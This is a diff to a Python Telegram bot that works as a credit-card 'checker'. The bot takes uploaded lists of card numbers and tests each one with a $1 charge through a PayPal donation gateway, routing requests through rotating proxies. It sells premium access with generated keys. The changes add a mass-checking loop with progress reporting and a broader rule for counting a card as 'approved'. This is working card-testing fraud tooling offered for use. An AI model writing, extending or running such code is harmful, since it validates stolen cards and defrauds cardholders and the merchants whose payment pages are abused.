@@ -20,6 +20,7 @@ PROXIES = [
 
 client = TelegramClient('bot', API_ID, API_HASH)
 
+# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -49,6 +50,7 @@ async def is_premium(user_id):
     except:
         return False
 
+# ================== KEY SYSTEM ==================
 async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
@@ -72,11 +74,8 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== MAIN CHECKER ==================
+# ================== CHECKER ==================
 async def check_card(card: str):
-    current_time = datetime.now().strftime('%H:%M:%S')
-    print(f"[{current_time}] CHECKING → {card}")
-
     try:
         proxy = random.choice(PROXIES)
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
@@ -86,31 +85,62 @@ async def check_card(card: str):
         async with aiohttp.ClientSession() as session:
             async with session.get(url, proxy=proxy_url, timeout=40) as r:
                 text = await r.text()
-                print(f"[{current_time}] STATUS: {r.status}")
-                print(f"[{current_time}] FULL RESPONSE: {text}")
 
-                # TERA EXACT CONDITION
-                if "ORDER APPROVED" in text.upper():
-                    print(f"[{current_time}] ✅ ORDER APPROVED → CHARGED $1")
+                if r.status == 200 and any(x in text.lower() for x in ["approved", "success", "live", "charged", "order approved"]):
                     return {"status": "Approved", "response": "Charged $1"}
                 else:
-                    print(f"[{current_time}] ❌ ORDER NOT APPROVED")
                     return {"status": "Declined", "response": "Declined"}
 
-    except Exception as e:
-        print(f"[{current_time}] ERROR: {e}")
+    except:
         return {"status": "Declined", "response": "Error"}
 
-async def send_approved(event, card):
-    msg = f"""
-**Approved ✅**
+# ================== MAIN PROCESS WITH BEAUTIFUL UI ==================
+async def process_mass(event, cards):
+    total = len(cards)
+    approved = 0
+    declined = 0
+
+    status_msg = await event.reply(
+        f"**🔥 WeAnimals Media Checker**\n\n"
+        f"Found **{total}** valid CCs\n"
+        f"All CCs will be checked\n\n"
+        f"Cooking CCs One by One..."
+    )
+
+    for i, card in enumerate(cards):
+        result = await check_card(card)
+
+        if result["status"] == "Approved":
+            approved += 1
+            await event.reply(f"**Approved ✅**\n`{card}`\nCharged $1")
+        else:
+            declined += 1
+
+        progress = f"""
+**Progress**
 ━━━━━━━━━━━━━
-[ϟ] 𝗖𝗖 - `{card}`
-[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : Charged $1
-[ϟ] 𝗚𝗮𝘁𝗲 - PayPal Donate
+Card → {card[:6]}******{card[-4:]}
+Charge → [{approved}] 💎
+Approve → [{approved}] 🔥
+Decline → [{declined}] ❌
+Progress → [{i+1}/{total}] ✅
 ━━━━━━━━━━━━━
 """
-    await event.reply(msg)
+        try:
+            await status_msg.edit(progress)
+        except:
+            pass
+
+        await asyncio.sleep(4)
+
+    await status_msg.edit(f"""
+**✅ CHECK FINISHED**
+━━━━━━━━━━━━━
+Total Cards : **{total}**
+Approved    : **{approved}** 🔥
+Declined    : **{declined}** ❌
+━━━━━━━━━━━━━
+""")
 
 # ================== BOT ==================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
@@ -160,18 +190,11 @@ async def txt_handler(event):
     if not cards:
         return await event.reply("❌ No valid cards!")
 
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check...")
-
-    for card in cards:
-        result = await check_card(card)
-        if result["status"] == "Approved":
-            await send_approved(event, card)
-        else:
-            await event.reply(f"❌ Declined\n`{card}`")
-        await asyncio.sleep(5)
+    await event.reply(f"✅ Found **{len(cards)}** valid CCs in file\nAll CCs will be checked")
+    asyncio.create_task(process_mass(event, cards))
 
 async def main():
-    print("🚀 Bot Started - Final Fixed Logic")
+    print("🚀 Bot Started")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
